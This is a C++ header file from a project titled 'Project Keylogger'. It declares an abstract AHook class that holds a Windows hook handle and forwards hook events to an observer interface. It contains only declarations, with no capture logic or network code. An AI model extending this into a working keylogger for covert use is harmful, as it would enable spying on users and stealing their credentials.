/**
 *							Project Keylogger
 */


#ifndef						_AHOOK_H
#define						_AHOOK_H

#include					<iostream>
#include					<vector>

#include					"IHookObserver.h"

class						AHook {
public: 
    
   AHook(const IHookObserver&);
    
    virtual const bool		setHook() = 0;
    void					notify(int, WPARAM, LPARAM);
    bool					unsetHook();
	const HHOOK				getHook() const;

protected: 

	HHOOK					_hHook;
	const IHookObserver&		_observer;
};

#endif //_AHOOK {ABSTRACT}_H